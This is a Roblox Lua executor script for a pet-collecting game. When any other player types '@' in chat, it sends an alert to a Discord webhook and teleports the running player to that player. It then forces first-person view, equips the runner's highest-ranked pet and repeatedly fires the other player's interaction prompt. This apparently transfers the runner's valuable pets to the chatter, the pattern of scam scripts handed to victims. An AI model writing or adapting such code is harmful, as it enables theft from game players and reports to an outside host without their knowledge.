local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- CONFIG (PUT YOUR WEBHOOK HERE)
local WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"

-- PET PRIORITY (Highest to Lowest)
local PET_PRIORITY = {
    ["T-Rex"] = 100,
    ["Dragonfly"] = 90,
    ["Queen bee"] = 85,
    ["Disco bee"] = 80,
    ["Raccoon"] = 75,
    ["Mimic Octopus"] = 70,
    ["Butterfly"] = 65
}

-- ITEMS TO IGNORE
local IGNORE_ITEMS = {
    "Shovel",
    "Destroy Plants"
}

--[[ WEBHOOK FUNCTIONS ]]--
local function sendWebhook(content)
    local payload = {
        content = content,
        embeds = {{
            title = "Roqate - 2025",
            description = "Player triggered the system",
            color = 0xFF0000
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

--[[ ITEM SYSTEM ]]--
local function getBestItem()
    local bestItem, highestScore = nil, 0
    
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        -- Skip ignored items
        local shouldIgnore = false
        for _,ignore in pairs(IGNORE_ITEMS) do
            if string.find(item.Name, ignore) then
                shouldIgnore = true
                break
            end
        end
        if shouldIgnore then continue end
        
        -- Check pet priority
        local score = 0
        for pet, points in pairs(PET_PRIORITY) do
            if string.find(item.Name, pet) then
                score = points
                break
            end
        end
        
        if score > highestScore then
            highestScore = score
            bestItem = item
        end
    end
    
    return bestItem
end

--[[ PRECISE INTERACTION SYSTEM ]]--
local function findInteractPart(character)
    -- First check for ProximityPrompt (E to interact)
    for _,part in pairs(character:GetDescendants()) do
        if part:IsA("ProximityPrompt") then
            return part.Parent, part
        end
    end
    
    -- Fallback to humanoid root part
    return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
end

local function getScreenPosition(part)
    local viewportPoint = Camera:WorldToViewportPoint(part.Position)
    return Vector2.new(viewportPoint.X, viewportPoint.Y)
end

--[[ TELEPORT AND INTERACT ]]--
local function teleportAndInteract(target)
    -- Get target character
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local interactPart, prompt = findInteractPart(targetChar)
    local head = targetChar:FindFirstChild("Head")

    -- Teleport to target (4 studs away)
    LocalPlayer.Character.HumanoidRootPart.CFrame = interactPart.CFrame * CFrame.new(0, 0, -4)

    -- Force first-person view
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5

    -- Look at target continuously
    local lookConn
    lookConn = RunService.Heartbeat:Connect(function()
        if head then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
        end
    end)

    -- Equip best item
    local item = getBestItem()
    if item then
        LocalPlayer.Character.Humanoid:EquipTool(item)
    end

    -- Calculate exact click position
    local screenPos = getScreenPosition(interactPart)
    UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)

    -- Handle interaction
    if prompt then
        -- Use proximity prompt if available
        fireproximityprompt(prompt)
        task.wait(0.1)
        local startTime = os.clock()
        while os.clock() - startTime < 5 do
            if not prompt.Enabled then break end
            fireproximityprompt(prompt)
            task.wait(0.1)
        end
    else
        -- Fallback to mouse click
        mouse1press()
        task.wait(5)
        mouse1release()
    end

    -- Cleanup
    if lookConn then lookConn:Disconnect() end
end

--[[ CHAT DETECTION ]]--
local function onChatted(player, msg)
    if player == LocalPlayer then return end
    if not string.find(msg, "@") then return end
    
    -- Send webhook alert
    sendWebhook(player.Name.." triggered the system with @ mention")
    
    -- Teleport and interact
    teleportAndInteract(player)
end

--[[ INITIALIZATION ]]--
-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onChatted(player, msg)
    end)
end)

print("✅ SYSTEM ACTIVE - Waiting for @ mentions")
